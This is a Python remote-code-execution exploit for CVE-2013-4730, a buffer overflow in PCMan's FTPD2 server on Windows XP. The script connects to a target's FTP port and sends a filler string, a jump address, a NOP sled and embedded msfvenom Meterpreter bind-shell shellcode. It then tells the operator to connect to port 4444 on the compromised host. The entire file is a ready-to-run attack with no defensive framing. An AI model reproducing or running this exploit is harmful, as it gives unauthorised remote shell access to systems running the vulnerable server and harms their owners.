#!/usr/bin/env python

#---------------------------
# Author: Krkn
# Target ARCH: WinXP - x86
# CVE: CVE-2013-4730
# Description: Buffer overflow in PCMan's FTPD2 Server.
# Usage: python PCManFTPD2_RCE.py {Target IP}
#---------------------------

import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)

junk = "\x41" * 2007
jmp = "\x7B\x46\x86\x7C"
nop = "\x90" * 20

#windows meterpreter bind tcp shell port 4444
#msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f python -b "\x00\x0a\x0d\xff"
buf =  b""                                                                            
buf += b"\xda\xd4\xd9\x74\x24\xf4\x58\xbf\x95\x33\x12\x37\x29"                        
buf += b"\xc9\xb1\x4e\x31\x78\x18\x83\xc0\x04\x03\x78\x81\xd1"
buf += b"\xe7\xcb\x41\x97\x08\x34\x91\xf8\x81\xd1\xa0\x38\xf5"
buf += b"\x92\x92\x88\x7d\xf6\x1e\x62\xd3\xe3\x95\x06\xfc\x04"
buf += b"\x1e\xac\xda\x2b\x9f\x9d\x1f\x2d\x23\xdc\x73\x8d\x1a"
buf += b"\x2f\x86\xcc\x5b\x52\x6b\x9c\x34\x18\xde\x31\x31\x54"
buf += b"\xe3\xba\x09\x78\x63\x5e\xd9\x7b\x42\xf1\x52\x22\x44"
buf += b"\xf3\xb7\x5e\xcd\xeb\xd4\x5b\x87\x80\x2e\x17\x16\x41"
buf += b"\x7f\xd8\xb5\xac\xb0\x2b\xc7\xe9\x76\xd4\xb2\x03\x85"
buf += b"\x69\xc5\xd7\xf4\xb5\x40\xcc\x5e\x3d\xf2\x28\x5f\x92"
buf += b"\x65\xba\x53\x5f\xe1\xe4\x77\x5e\x26\x9f\x83\xeb\xc9"
buf += b"\x70\x02\xaf\xed\x54\x4f\x6b\x8f\xcd\x35\xda\xb0\x0e"
buf += b"\x96\x83\x14\x44\x3a\xd7\x24\x07\x52\x14\x05\xb8\xa2"
buf += b"\x32\x1e\xcb\x90\x9d\xb4\x43\x98\x56\x13\x93\xdf\x4c"
buf += b"\xe3\x0b\x1e\x6f\x14\x05\xe4\x3b\x44\x3d\xcd\x43\x0f"
buf += b"\xbd\xf2\x91\xba\xb6\x55\x4a\xd9\x34\x0f\x6b\x77\xc5"
buf += b"\xa7\x81\x88\x16\xd7\xa9\x42\x3f\x7f\x54\x6d\x51\x23"
buf += b"\xd1\x8b\x3b\xcb\xb7\x04\xd4\x29\xec\x9c\x43\x52\xc6"
buf += b"\x66\x4b\xd9\xb1\x3f\x24\x96\xab\xf8\x4b\x27\xfe\xae"
buf += b"\xdb\xa3\xed\x6a\xfd\xb4\x3b\xdb\x6a\x22\xb1\x8a\xd9"
buf += b"\xd3\xc6\x86\x88\x13\x53\x2d\x1b\x44\xcb\x2f\x7a\xa2"
buf += b"\x54\xcf\xa9\xb1\x93\x2f\x2c\x98\xe8\x06\xba\xa2\x86"
buf += b"\x66\x2a\x22\x57\x31\x20\x22\x3f\xe5\x10\x71\x5a\xea"
buf += b"\x8c\xe6\xf7\x7f\x2f\x5e\xab\x28\x47\x5c\x92\x1f\xc8"
buf += b"\x9f\xf1\x23\x0f\x5f\x84\x24\xf1\x9c\x51\xed\x84\xcb"
buf += b"\x61\x4a\x96\xbe\xc4\xfb\x3d\xc0\x5b\xfb\x17"

sploit = junk
sploit += jmp
sploit += nop
sploit += buf

print("[+] Packaging exploit...")
print("[+] Sending to target...")

s.send(sploit)
print("[+] Exploit sent! Check for connection to target on port 4444.")
#s.recv(1024)
s.close()
